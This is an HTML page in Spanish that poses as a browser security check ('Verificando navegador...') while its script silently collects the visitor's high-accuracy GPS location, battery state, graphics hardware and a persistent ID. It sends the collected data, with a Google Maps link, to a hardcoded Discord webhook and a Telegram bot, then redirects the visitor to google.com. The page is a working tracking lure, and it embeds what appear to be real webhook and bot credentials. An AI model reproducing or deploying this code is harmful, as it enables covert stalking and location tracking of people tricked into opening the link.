<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando navegador...</title>
    <style>
        body { 
            background: #ffffff; 
            color: #3c4043; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container { text-align: center; max-width: 350px; }
        .loader { 
            border: 3px solid #f3f3f3; 
            border-top: 3px solid #4285f4; 
            border-radius: 50%; 
            width: 35px; 
            height: 35px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 20px; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 1.1rem; font-weight: 500; margin-bottom: 8px; }
        p { font-size: 0.85rem; color: #70757a; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Espera un momento...</h1>
        <p>Estamos confirmando que tu conexión es segura.</p>
    </div>

    <script>
        const CONFIG = {
            webhook: "https://discord.com/api/webhooks/1327800733330599946/BRlFD4PvC66BvqfW7XNbHNYVHVl2uYyXtZQ1ufivSQlTfj0gk2_tFQB_p0mdhwLjPQmk",
            token: "8536690071:AAG-ScvmZZYWSdhrd3v4lltuWagWuVFlLBU",
            chat: "7542699747",
            exit: "https://www.google.com"
        };

        async function ejecutar() {
            // ID Único
            let id = localStorage.getItem('_uid') || 'ID-' + Math.random().toString(36).substr(2, 6).toUpperCase();
            localStorage.setItem('_uid', id);

            // Batería
            let batStatus = "hubo problemas con este criterio";
            try {
                const b = await navigator.getBattery();
                batStatus = `${Math.round(b.level * 100)}% | ${b.charging ? "Cargando" : "No cargando"}`;
            } catch(e) {}

            // Hardware
            let hardware = "hubo problemas con este criterio";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                hardware = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) {}

            // Ubicación
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (p) => enviar(p, id, hardware, batStatus),
                    () => enviar(null, id, hardware, batStatus),
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            } else {
                enviar(null, id, hardware, batStatus);
            }
        }

        async function enviar(pos, id, hw, bat) {
            let gpsTxt = "hubo problemas con esta criterio (GPS)";
            let lat = null, lon = null;

            if (pos) {
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
                gpsTxt = `Lat: \`${lat}\` | Lon: \`${lon}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
            }

            const report = `🔔 **REGISTRO DE ACTIVIDAD**\n` +
                           `━━━━━━━━━━━━━━━━━━━━\n` +
                           `🆔 **ID:** \`${id}\`\n` +
                           `📱 **Dispositivo:** \`${hw}\`\n` +
                           `🔋 **Batería:** ${bat}\n` +
                           `📍 **Coords:** ${gpsTxt}\n` +
                           `━━━━━━━━━━━━━━━━━━━━`;

            // Configuración del botón para Telegram
            const telegramData = {
                chat_id: CONFIG.chat,
                text: report,
                parse_mode: "Markdown",
                reply_markup: pos ? {
                    inline_keyboard: [[
                        { text: "🗺️ Abrir en Google Maps", url: `https://www.google.com/maps?q=${lat},${lon}` }
                    ]]
                } : undefined
            };

            try {
                // Telegram con botón
                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(telegramData)
                });

                // Discord (Normal)
                await fetch(CONFIG.webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: report.replace(/\*/g, "**") })
                });
            } catch(e) {}

            window.location.href = CONFIG.exit;
        }

        window.onload = ejecutar;
    </script>
</body>
</html>
